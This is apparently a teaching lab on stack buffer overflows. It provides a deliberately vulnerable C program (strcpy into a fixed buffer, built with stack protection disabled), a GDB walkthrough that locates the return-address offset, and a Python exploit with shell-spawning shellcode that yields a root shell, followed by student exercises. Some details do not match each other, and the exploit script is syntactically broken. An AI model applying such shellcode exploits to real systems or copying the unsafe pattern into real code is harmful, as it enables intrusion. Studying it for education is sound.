# BoF intro

## Introduction

## Goal

## Preparation


```
$ cat vulnerable.c
#include <stdio.h>
#include <stdlib.h>
#include <crypt.h>
#include <string.h>

// hash of: "ourteacheristehbest"
const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";


int checkPassword(char *password) {
	char *hash;

	// $6$ is SHA256
	hash = crypt(password, "$6$saaaaalty");

	if (strcmp(hash, adminHash) == 0) {
		return 1;
	} else {
		return 0;
	}
}



void handleData(char *username, char *password) {
	int isAdmin = 0;
	char firstname[64];

	isAdmin = checkPassword(password);
	strcpy(firstname, username);

	if(isAdmin > 0) {
		printf("You ARE admin!\nBe the force with you.\n");
	} else {
		printf("You are not admin.\nLame.\n");
	}
}



int main(int argc, char **argv) {
	if (argc != 3) {
		printf("Call: %s <name> <password>\n", argv[0]);
		exit(0);
	}

	handleData(argv[1], argv[2]);
}
```

How to compile:

```
gcc -m32 -z execstack -fno-stack-protector vulnerable.c -o vulnerable -lcrypt
```

or `make vulnerable`

## Analysis

```
$ file vulnerable
vulnerable: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f6b1aab172bde7f561e30ef84f253da4a081d8d7, not stripped
```

Find address of buffer using GDB

Check disassembly of handleData in 64 bit binary:
```
root@hlUbuntu32aslr:~/challenges/challenge5# gdb -q vulnerable
Reading symbols from vulnerable...(no debugging symbols found)...done.
gdb-peda$ disas handleData
Dump of assembler code for function handleData:
   0x080485bd <+0>:	push   ebp
   0x080485be <+1>:	mov    ebp,esp
   0x080485c0 <+3>:	sub    esp,0x58
   0x080485c3 <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080485ca <+13>:	sub    esp,0xc
   0x080485cd <+16>:	push   DWORD PTR [ebp+0xc]
   0x080485d0 <+19>:	call   0x804857b <checkPassword>
   0x080485d5 <+24>:	add    esp,0x10
   0x080485d8 <+27>:	mov    DWORD PTR [ebp-0xc],eax
   0x080485db <+30>:	push   DWORD PTR [ebp+0x8]
   0x080485de <+33>:	push   0x8048781
   0x080485e3 <+38>:	push   0x8048785
   0x080485e8 <+43>:	lea    eax,[ebp-0x4c]
   0x080485eb <+46>:	push   eax
   0x080485ec <+47>:	call   0x8048460 <sprintf@plt>
   0x080485f1 <+52>:	add    esp,0x10
   0x080485f4 <+55>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080485f8 <+59>:	jle    0x8048613 <handleData+86>
   0x080485fa <+61>:	sub    esp,0x4
   0x080485fd <+64>:	push   DWORD PTR [ebp-0xc]
   0x08048600 <+67>:	lea    eax,[ebp-0x4c]
   0x08048603 <+70>:	push   eax
   0x08048604 <+71>:	push   0x804878c
   0x08048609 <+76>:	call   0x8048420 <printf@plt>
   0x0804860e <+81>:	add    esp,0x10
   0x08048611 <+84>:	jmp    0x804862a <handleData+109>
   0x08048613 <+86>:	sub    esp,0x4
   0x08048616 <+89>:	push   DWORD PTR [ebp-0xc]
   0x08048619 <+92>:	lea    eax,[ebp-0x4c]
   0x0804861c <+95>:	push   eax
   0x0804861d <+96>:	push   0x80487b4
   0x08048622 <+101>:	call   0x8048420 <printf@plt>
   0x08048627 <+106>:	add    esp,0x10
   0x0804862a <+109>:	nop
   0x0804862b <+110>:	leave  
   0x0804862c <+111>:	ret    
End of assembler dump.
```

Set Breakpoint in GDB: We want to break after the strcpy() finishes:
```
(gdb) break *0x00000000004007b8
Breakpoint 1 at 0x4007b8  
```
Run Programm with AAAAAAAAAAA and asdf as parameter

Lets start the program and see where the first parameter is stored. RDI will point to the destination:

```
(gdb) run AAAAAAAAAAA asdf
Starting program: /home/hacker/7380/challenge3_64 AAAAAAAAAAA asdf

Breakpoint 1, 0x00000000004007b8 in handleData ()
(gdb) x/8x $rdi
0x7fffffffe8c0:    0x41414141    0x41414141    0x00414141    0x00007fff
0x7fffffffe8d0:    0xf780a1a8    0x00007fff    0xf7ff79b0    0x00007fff
(gdb) i r rdi
rdi            0x7fffffffe8c0    140737488349376
```
Crash program with 90 x "A"

Re-run the programm with overlong arguments; you see some 0x4141 on the stack (Hex code for A) / nothing to see from B
```
(gdb) run `python -c 'print "A" * 90 + "BBBB"'` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hacker/7380/challenge3_64 `python -c 'print "A" * 90 + "BBBB"'` test

Breakpoint 1, 0x00000000004007b8 in handleData ()
(gdb) c
Continuing.
You ARE admin!
Be the force with you.

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424141 in ?? ()
```

Crash program with 88 x "A"
```
(gdb) run `python -c 'print "A" * 88 + "BBBB"'` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hacker/7380/challenge3_64 `python -c 'print "A" * 88 + "BBBB"'` test

Breakpoint 1, 0x00000000004007b8 in handleData ()
(gdb) c
Continuing.
You ARE admin!
Be the force with you.

Program received signal SIGSEGV, Segmentation fault.
0x0000000042424242 in ?? ()
```
Therefore, the offset is 88 bytes.


Create Exploit with Offset = 88

Shellcode spawns a shell
```
#!/usr/bin/python

/* exploit for challenge3.py */


import sys

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buf_size = 64
offset = 88

ret_addr = "\xb0\xe8\xff\xff\xff\x7f"

/* fill up to 64 bytes */
exploit = "\x90" * (buf_size - len(shellcode))
exploit += shellcode

/* garbage between buffer and RET */
exploit += "A" * (offset - len(exploit))

/* add ret */
exploit += ret_addr sys.stdout.write(exploit)
```

Exploit in GDB

Let's exploit the binary in GDB (within the debugger). Please use the "file ./challenge3_64" before running the binary!
```
(gdb) file ./challenge3_64
(gdb) run `python bof3.py` test
test Starting program: /home/hacker/bfh/day2/challenge3 `python bof3-2.py` test
You ARE admin!
Be the force with you.
isAdmin: 0x41414141
process 13510 is executing new program: /bin/dash
#  
```

Exploit without GDB (directly)

Let's now exploit the binary directly.
```
# ./challenge3 `python bof3.py` test
You ARE admin!
Be the force with you.
isAdmin: 0x41414141
# id
uid=0(root) gid=0(root) groups=0(root)
#  
```

## Core Dump Analysis

In case the exploit is not working; find out the proper return address using core dumps
```
 ulimit -c unlimited
./challenge3_64 `python bof3.py` test              (produces core file)
gdb challenge3_64 core                                       (find out stack addresses using gdb)
patch bof3.py with address out of core file
```

## Missions
Try to implement the following things:

Create an exploit for the x32 version
Can you create a reliable exploit which works in both GDB, and without GDB?
Security Questions
Please respond to the following security questions

How did you find the offset to SIP?
How did you find the address of the shellcode?
Could we use our exploit if ASLR would have been enabled? (echo 1 > /proc/sys/kernel/randomize_va_space)
